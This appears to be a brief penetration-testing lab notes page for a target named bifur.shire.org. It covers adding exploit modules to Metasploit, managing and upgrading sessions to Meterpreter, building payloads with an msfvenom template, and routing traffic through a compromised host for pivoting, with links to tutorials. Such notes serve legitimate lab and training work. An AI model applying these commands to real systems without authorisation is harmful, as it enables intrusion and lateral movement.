# Target 3: bifur.shire.org

## Adding New Modules to Metasploit

```
searchsploit -m file.rb
sudo -i
cp file.rb /root/.msf4/modules/.exploits
msfconsole
search file.rb
```

## Metasploit/Meterpreter Notes

* sessions -u \[session #] to elevate to Meterpreter
* CTRL + z to background a Metasploit session
* sessions -i \[session #] to return to a backgrounded Metasploit session
* msfvenom -p \[payload] LHOST=\[IP] LPORT=\[port] -f \[format] > \[file name]
* route add \[subnet] \[netmask] \[session ID] to route Metasploit activity through an active Meterpreter session

## Resources

{% embed url="https://f5-agility-labs-waf.readthedocs.io/en/latest/class2/module1/lab2.html" %}

{% embed url="https://infinitelogins.com/2021/02/20/using-metasploit-routing-and-proxychains-for-pivoting/" %}

{% embed url="https://null-byte.wonderhowto.com/how-to/get-root-with-metasploits-local-exploit-suggester-0199463/" %}

{% embed url="https://medium.com/@nikosch86/how-to-metasploit-behind-a-nat-or-pivoting-and-reverse-tunneling-with-meterpreter-1e747e7fa901" %}
